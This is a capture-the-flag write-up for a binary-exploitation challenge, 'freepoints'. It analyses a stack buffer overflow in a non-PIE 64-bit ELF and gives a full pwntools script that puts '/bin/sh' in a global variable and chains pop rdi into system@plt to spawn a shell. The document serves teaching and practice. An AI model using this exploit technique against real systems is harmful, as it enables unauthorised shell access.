## Binary : freepoints
## Level  : Easy
## Points : 50 pts

this challenge was an ELF 64-bit not stripped

Protections :
```
CANARY    	: disabled

FORTIFY  	: disabled

NX        	: ENABLED

PIE       	: disabled

RELRO     	: Partial
```

## Analysis 


```c
int checkdistro()
{
  return system("uname -s");
}

```


```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [sp+0h] [bp-10h]@1

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts("want some free points ? enter your nickname :");
  read(0, &nickname, 0x10uLL);
  puts("how many points you want? : ");
  read(0, &buf, 0x40uLL);
  return 0;
}
```


we have two main functions  checkdistro() which contain a system function checks our distro (normally the output is Linux) and we have no controll over the argument .

a main() which asks for 2 inputs from the user the first input get stored in a global var &nickname 

```c
gdb-peda$ p &nickname
$3 = (<data variable, no debug info> *) 0x601070 <nickname>
gdb-peda$ x/s 0x601070
0x601070 <nickname>:    "nicknamehere\n"
gdb-peda$ 
```

and last input get stored in &buf ont the stack  but the size is more than expected from buf so basically we have a buffer overflow


```c

gdb-peda$ x/xg $rsp
0x7fffffffdc78: 0x413b414144414128
gdb-peda$ pattern offset 0x413b414144414128
4700422384665051432 found at offset: 24
gdb-peda$ 
rip            0xa4242424242       0xa4242424242

```


## Exploit building :

to sum up we have PIE disabled so we don't have to be bothered by leaking and calculating , a system function and  golbal variable to store  what ever we need in it something like  system(&nickname);


```py
from pwn import *

#r = remote("198.211.116.222",9000)
r = process("./freepoints")

system = 0x400520  #system@plt address
poprdi = 0x400743  #pop rdi; ret
nickname = 0x601070 # nickname address


pld  = "A"*24
pld += p64(poprdi)
pld += p64(nickname)
pld += p64(system)

r.recvuntil(":")
r.sendline("/bin/sh\x00") #store /bin/sh into &nickname

r.recvuntil(":")
r.sendline(pld)

r.interactive()

```
